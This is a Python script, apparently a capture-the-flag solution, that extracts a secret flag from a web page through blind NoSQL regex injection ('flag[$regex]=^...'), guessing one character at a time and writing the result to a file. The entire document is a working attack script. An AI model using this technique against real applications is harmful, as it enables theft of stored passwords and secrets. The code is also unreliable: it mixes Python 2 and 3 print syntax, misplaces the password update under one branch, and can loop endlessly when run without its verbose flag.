import requests
import sys

print sys.argv

host=""
page="index.php"

caracteres=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','@','!','_','&','~','=','-','+','^','$','?','.','|','*','&','#','\\']
success="Yeah"
unsuccess="This is not"
passwdMemo=""


hasNext=1
nbTry=0
i=0
nbchar=0

while hasNext==1 :
	if len(sys.argv)>=2 and sys.argv[1]=="-v":
		print("[ ] Attempt n "+str(nbTry)+" :")

	if caracteres[i] in ['\\','+','^','$','?','.','|','*','#']:
		inject="\\"+caracteres[i]
	else :
		inject=caracteres[i]

		passwd=passwdMemo+caracteres[i]

	payload="?chall_name=nosqlblind&flag[$regex]=^"+'.'*nbchar+inject+".*"

	r = requests.get(host+page+payload)
	nbTry+=1

	if len(sys.argv)>=2 and sys.argv[1]=="-v":
		print("[ ] Status code : "+str(r.status_code))

	if r.status_code==200:
		if r.text.find(success) != -1:
			print("[+] Next char found "+passwd)
			i=0
			passwdMemo=passwd
			nbchar=nbchar+1
		elif r.text.find(unsuccess) != -1 and len(sys.argv)>=2 and sys.argv[1]=="-v":
			print("[-] Fail "+passwd)
			i=i+1
		elif len(sys.argv)>=2 and sys.argv[1]=="-v" :
			print("[-] Reponse imprevue les frr")
			if len(sys.argv)>=2 and sys.argv[1]=="-v":
				print(r.text)
	else:
		print("[-] Erreur requete code "+str(r.status_code))

	if i>=len(caracteres) :
		hasNext=0



print("Flag : "+passwd)
fichier = open("data.txt", "a")
fichier.write(passwd)
fichier.close()
